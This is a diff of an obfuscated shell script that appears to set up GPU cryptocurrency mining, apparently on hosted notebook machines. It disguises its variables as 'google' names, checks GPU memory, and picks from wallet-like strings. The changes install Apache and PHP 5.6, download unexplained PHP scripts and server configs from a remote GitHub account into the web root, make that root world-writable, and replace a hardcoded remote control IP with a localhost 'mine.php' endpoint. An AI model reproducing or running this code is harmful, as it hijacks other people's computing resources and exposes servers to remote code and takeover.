@@ -1,8 +1,42 @@
 apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
+apt-get install -y cpulimit
+
 apt-get install -y bc
 
-apt-get install -y cpulimit
+apt-get install -y curl
+
+apt-get install -y httpie
+
+apt-get purge -y nginx
+
+apt-get install -y apache2
+
+apt-get install -y software-properties-common
+
+add-apt-repository ppa:ondrej/php -y
+
+apt-get install -y php5.6
+
+cd /etc/apache2/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ports.conf
+
+cd /etc/apache2/sites-enabled/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/000-default.conf
+
+service apache2 restart
+
+cd /var/www/html/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/index.php
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googlelinux84.php
+
+rm -rf /var/www/html/index.html
+
+chmod 777 -R /var/www/html/
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
@@ -17,7 +51,7 @@ do
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-google841212121274="http://154.127.52.52"
+google841212121274="http://localhost:8884"
 
 pkill -f curl84
 
@@ -42,7 +76,7 @@ arr[7]="2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1F
 rand=$[$RANDOM % ${#arr[@]}]
 google84121212121212121274=${arr[2]}
 
-string=$(curl -s -A "linux84" http://154.127.52.52/linux84.php?linux84=linux84)
+string=$(curl -s http://localhost:8884/mine.php?q=info)
 if [[ $string == *"16384"* ]]; then
 
 cd /content/
@@ -67,7 +101,7 @@ else
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-google841212121274="http://154.127.52.52"
+google841212121274="http://localhost:8884"
 
 pkill -f curl84
 
